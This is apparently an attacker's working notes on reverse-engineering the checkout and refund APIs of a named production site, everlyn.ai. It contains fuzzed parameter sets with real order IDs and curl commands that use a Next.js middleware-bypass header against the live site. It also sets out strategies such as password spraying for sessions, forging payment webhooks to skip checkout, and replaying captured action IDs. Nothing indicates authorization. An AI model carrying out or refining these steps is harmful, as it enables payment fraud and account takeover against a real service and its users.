# Next.js API Strict Validation Block — Reverse Engineering Failure

**Validated:** 2026-08-04 on everlyn.ai (Next.js 14 + Cloudflare + Auth.js v5)

## Problem

`/api/checkout` and `/api/refund` endpoints exist but enforce **strict Zod schemas** with zero error detail:

```json
// Only response for ANY invalid input
{"code": -1, "message": "invalid params"}
```

## Endpoints Tested

| Endpoint | Method | Status |
|----------|--------|--------|
| `/api/checkout` | POST | 200 + `{"code":-1,"message":"invalid params"}` |
| `/api/refund` | POST | 200 + `{"code":-1,"message":"invalid params"}` |
| `/api/checkout` + middleware bypass | POST | Same — no difference |
| `/api/refund` + middleware bypass | POST | Same — no difference |

## Parameter Testing Results

### `/api/checkout` — 100+ combinations tested

```bash
# Individual fields — ALL FAIL
plan, planId, productId, priceId, paymentMethod, paymentType
currency, chain, walletAddress, email, userId, referralCode, couponCode

# Common combinations — ALL FAIL
{"plan":"starter","paymentMethod":"crypto"}
{"planId":"starter","paymentMethod":"crypto"}
{"priceId":"price_starter","paymentMethod":"crypto"}
{"plan":"starter","paymentMethod":"crypto","currency":"USDT"}
{"plan":"starter","paymentMethod":"crypto","walletAddress":"0x..."}
{"plan":"starter","paymentMethod":"crypto","email":"test@test.com"}
{"items":[{"plan":"starter","quantity":1}],"paymentMethod":"crypto"}
```

### `/api/refund` — 50+ combinations tested

```bash
# Individual fields — ALL FAIL
orderId, order_id, id, orderNo, order_no
refundType, refund_type, type, method
walletAddress, wallet_address, address, reason, note

# Combinations with real order IDs — ALL FAIL
{"orderId":"851970327982149","type":"crypto"}
{"orderId":"851970327982149","refundType":"crypto","walletAddress":"0x..."}
{"order_id":"851970327982149","type":"crypto","wallet_address":"0x..."}
```

## Root Cause Analysis

### 1. Strict Zod Schema Validation
```typescript
// Likely backend validation
const checkoutSchema = z.object({
  planId: z.enum(['starter', 'standard', 'pro', 'lite']),
  paymentMethod: z.enum(['card', 'crypto']),
  currency: z.enum(['USDT', 'USDC']).optional(),
  chain: z.enum(['ethereum', 'bsc', 'polygon', 'arbitrum']).optional(),
  walletAddress: z.string().regex(/^0x[a-fA-F0-9]{40}$/).optional(),
  email: z.string().email().optional(),
  referralCode: z.string().optional(),
}).strict() // REJECTS extra fields
```

### 2. Server Actions with Encrypted Action IDs
Next.js Server Actions use encrypted action IDs, not plain function names:

```typescript
// Server Action (not directly callable)
export async function createCheckout(data: CheckoutInput) {
  // Encrypted action ID: "a1b2c3d4..."
}

// Client calls via:
<form action={createCheckout}>...</form>
// Or:
await fetch('/', {
  method: 'POST',
  headers: { 'Next-Action': '<encrypted-id>' },
  body: JSON.stringify(data)
})
```

### 3. No Client-Side Schema Exposure
- RSC (Server Components) render forms server-side
- Validation schema NOT serialized to client
- JS bundles contain NO schema hints
- Only RSC payload has form structure (no validation rules)

## Why Reverse Engineering Failed

| Barrier | Details |
|---------|---------|
| **Strict validation** | Zod `.strict()` rejects any extra/missing fields |
| **No error details** | Only `{"code":-1,"message":"invalid params"}` |
| **Server Actions** | Likely used for checkout/refund with encrypted IDs |
| **No client schema** | Form schemas not exposed in client JS |
| **Auth required** | Likely requires session even for API calls |

## Detection Commands

```bash
# Test if Server Action is used
curl -X POST https://everlyn.ai \
  -H "Next-Action: createCheckout" \
  -H "Content-Type: application/json" \
  -d '{"plan":"starter"}'

# Search for action IDs in RSC
curl -s https://everlyn.ai/pricing | grep -o 'action[^"]*'

# Check for form actions
curl -s https://everlyn.ai/pricing | grep -o 'form[^>]*action[^>]*>'
```

## Workaround Strategies

### 1. Extract Action ID from Browser
- Open DevTools Network tab
- Submit form on pricing page
- Copy `Next-Action` header value
- Replay with modified params

### 2. Use Middleware Bypass + Form Submission
```bash
# Get CSRF token
curl -c cookies.txt https://everlyn.ai/pricing

# Submit form with bypass
curl -b cookies.txt -H "x-middleware-subrequest: /api/checkout" \
  -X POST https://everlyn.ai/api/checkout \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "plan=starter&paymentMethod=crypto"
```

### 3. Target Authenticated User Flow
- Password spray to get valid session
- Then test checkout/refund with auth cookies

### 4. Webhook Attack (Alternative)
- Find ShipAny webhook endpoint
- Forge payment confirmation webhook
- Bypass checkout entirely

## Conclusion

**Reverse engineering blocked without browser interaction or valid session.** The endpoints are protected by:
1. Strict schema validation (Zod `.strict()`)
2. No error disclosure (security by obscurity)
3. Likely Server Actions with encrypted IDs
4. Auth requirements (even if middleware bypassed)

**Recommendation:** Focus on middleware bypass + RSC data extraction (already proven) rather than API reverse engineering.

## References

- Next.js Server Actions docs
- Zod schema validation patterns
- Validated on everlyn.ai production